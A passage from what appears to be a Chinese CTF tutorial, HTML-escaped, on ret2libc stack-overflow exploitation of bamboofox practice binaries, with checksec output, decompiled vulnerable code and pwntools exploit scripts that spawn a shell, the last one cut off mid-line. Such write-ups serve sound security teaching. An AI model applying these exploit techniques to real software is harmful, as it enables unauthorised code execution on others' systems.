&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;➜&lt;/span&gt;  &lt;span class=&#34;hljs-string&#34;&gt;ret2libc1&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;checksec&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;ret2libc1&lt;/span&gt;    &lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;Arch:&lt;/span&gt;     &lt;span class=&#34;hljs-string&#34;&gt;i386-32-little&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;RELRO:&lt;/span&gt;    &lt;span class=&#34;hljs-string&#34;&gt;Partial&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;RELRO&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;Stack:&lt;/span&gt;    &lt;span class=&#34;hljs-literal&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;canary&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;found&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;NX:&lt;/span&gt;       &lt;span class=&#34;hljs-string&#34;&gt;NX&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;enabled&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;PIE:&lt;/span&gt;      &lt;span class=&#34;hljs-literal&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;PIE&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;(0x8048000)&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{&lt;br&gt;  &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;hljs-comment&#34;&gt;// [sp+1Ch] [bp-64h]@1&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;setvbuf&lt;/span&gt;(stdout, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;setvbuf&lt;/span&gt;(_bss_start, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;RET2LIBC &amp;gt;_&amp;lt;&#34;&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;gets&lt;/span&gt;((&lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; *)&amp;amp;v4);&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;br&gt;}&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;➜  ret2libc1 ROPgadget --binary ret2libc1 --string &lt;span class=&#34;hljs-emphasis&#34;&gt;&#39;/bin/sh&#39;&lt;/span&gt;          &lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;Strings information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;0x08048720 : /bin/sh&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。&lt;/p&gt;
&lt;figure class=&#34;highlight ada&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ada&#34;&gt;.plt:&lt;span class=&#34;hljs-number&#34;&gt;08048460&lt;/span&gt; ; [&lt;span class=&#34;hljs-number&#34;&gt;00000006&lt;/span&gt; BYTES: COLLAPSED &lt;span class=&#34;hljs-keyword&#34;&gt;FUNCTION&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;_system.&lt;/span&gt; PRESS CTRL-NUMPAD+ TO EXPAND]&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下&lt;/p&gt;
&lt;figure class=&#34;highlight gradle&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gradle&#34;&gt;#!&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;bin/env python&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *&lt;br&gt;&lt;br&gt;sh = process(&lt;span class=&#34;hljs-string&#34;&gt;&#39;./ret2libc1&#39;&lt;/span&gt;)&lt;br&gt;&lt;br&gt;binsh_addr = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x8048720&lt;br&gt;system_plt = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x08048460&lt;br&gt;payload = flat([&lt;span class=&#34;hljs-string&#34;&gt;&#39;a&#39;&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, system_plt, &lt;span class=&#34;hljs-string&#34;&gt;&#39;b&#39;&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, binsh_addr])&lt;br&gt;sh.sendline(payload)&lt;br&gt;&lt;br&gt;sh.interactive()&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。&lt;/p&gt;
&lt;p&gt;这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。&lt;/p&gt;
&lt;h4 id=&#34;例-2¶&#34;&gt;&lt;a href=&#34;#例-2¶&#34; class=&#34;headerlink&#34; title=&#34;例 2¶&#34;&gt;&lt;/a&gt;例 2&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#2&#34;&gt;¶&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;这里以 bamboofox 中的 ret2libc2 为例&lt;/p&gt;
&lt;p&gt;点击下载: &lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2&#34;&gt;ret2libc2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下&lt;/p&gt;
&lt;figure class=&#34;highlight vim&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs vim&#34;&gt;##!/usr/bin/env &lt;span class=&#34;hljs-keyword&#34;&gt;python&lt;/span&gt;&lt;br&gt;from pwn import *&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;sh&lt;/span&gt; = process(&lt;span class=&#34;hljs-string&#34;&gt;&#39;./ret2libc2&#39;&lt;/span&gt;)&lt;br&gt;&lt;br&gt;gets_plt = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x08048460&lt;br&gt;system_plt = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x08048490&lt;br&gt;pop_ebx = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x0804843d&lt;br&gt;buf2 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x804a080&lt;br&gt;payload = flat(&lt;br&gt;    [&lt;span class=&#34;hljs-string&#34;&gt;&#39;a&#39;&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, gets_plt, pop_ebx, buf2, system_plt, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xdeadbeef, buf2])&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;sh&lt;/span&gt;.sendline(payload)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;sh&lt;/span&gt;.sendline(&lt;span class=&#34;hljs-string&#34;&gt;&#39;/bin/sh&#39;&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;sh&lt;/span&gt;.interactive()&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。&lt;/p&gt;
&lt;h4 id=&#34;例-3¶&#34;&gt;&lt;a href=&#34;#例-3¶&#34; class=&#34;headerlink&#34; title=&#34;例 3¶&#34;&gt;&lt;/a&gt;例 3&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3&#34;&gt;¶&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;这里以 bamboofox 中的 ret2libc3 为例&lt;/p&gt;
&lt;p&gt;点击下载: &lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3&#34;&gt;ret2libc3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;➜&lt;/span&gt;  &lt;span class=&#34;hljs-string&#34;&gt;ret2libc3&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;checksec&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;ret2libc3&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;Arch:&lt;/span&gt;     &lt;span class=&#34;hljs-string&#34;&gt;i386-32-little&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;RELRO:&lt;/span&gt;    &lt;span class=&#34;hljs-string&#34;&gt;Partial&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;RELRO&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;Stack:&lt;/span&gt;    &lt;span class=&#34;hljs-literal&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;canary&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;found&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;NX:&lt;/span&gt;       &lt;span class=&#34;hljs-string&#34;&gt;NX&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;enabled&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;PIE:&lt;/span&gt;      &lt;span class=&#34;hljs-literal&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;PIE&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;(0x8048000)&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{&lt;br&gt;  &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;hljs-comment&#34;&gt;// [sp+1Ch] [bp-64h]@1&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;setvbuf&lt;/span&gt;(stdout, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;setvbuf&lt;/span&gt;(stdin, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;No surprise anymore, system disappeard QQ.&#34;&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;Can you find it !?&#34;&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;gets&lt;/span&gt;((&lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; *)&amp;amp;v4);&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;br&gt;}&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。&lt;/li&gt;
&lt;li&gt;即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/niklasb/libc-database&#34;&gt;https://github.com/niklasb/libc-database&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。&lt;/p&gt;
&lt;p&gt;那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。&lt;strong&gt;当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/lieanu/LibcSearcher&#34;&gt;https://github.com/lieanu/LibcSearcher&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。&lt;/p&gt;
&lt;p&gt;这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;泄露 __libc_start_main 地址&lt;/li&gt;
&lt;li&gt;获取 libc 版本&lt;/li&gt;
&lt;li&gt;获取 system 地址与 /bin/sh 的地址&lt;/li&gt;
&lt;li&gt;再次执行源程序&lt;/li&gt;
&lt;li&gt;触发栈溢出执行 system(‘/bin/sh’)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;exp 如下&lt;/p&gt;
&lt;figure class=&#34;highlight gradle&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gradle&#34;&gt;#!&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;bin/env python&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; LibcSearcher&lt;br&gt;sh = process(&lt;span class=&#34;hljs-string&#34;&gt;&#39;./ret2libc3&#39;&lt;/span&gt;)&lt;br&gt;&lt;br&gt;ret2libc3 = ELF(&lt;span class=&#34;hljs-string&#34;&gt;&#39;./ret2libc3&#39;&lt;/span&gt;)&lt;br&gt;&lt;br&gt;puts_plt = ret2libc3.plt[&lt;span class=&#34;hljs-string&#34;&gt;&#39;puts&#39;&lt;/span&gt;]&lt;br&gt;libc_start_main_got = ret2libc3.got[&lt;span class=&#34;hljs-string&#34;&gt;&#39;__libc_start_main&#39;&lt;/span&gt;]&lt;br&gt;main = ret2libc3.symbols[&lt;span class=&#34;hljs-string&#34;&gt;&#39;main&#39;&lt;/span&gt;]&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;leak libc_start_main_got addr and return to main again&#34;&lt;/span&gt;&lt;br&gt;payload = flat([&lt;span class=&#34;hljs-string&#34;&gt;&#39;A&#39;&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, puts_plt, main, libc_start_main_got])&lt;br&gt;sh.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&#39;Can you find it !?&#39;&lt;/span&gt;, payload)&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;get the 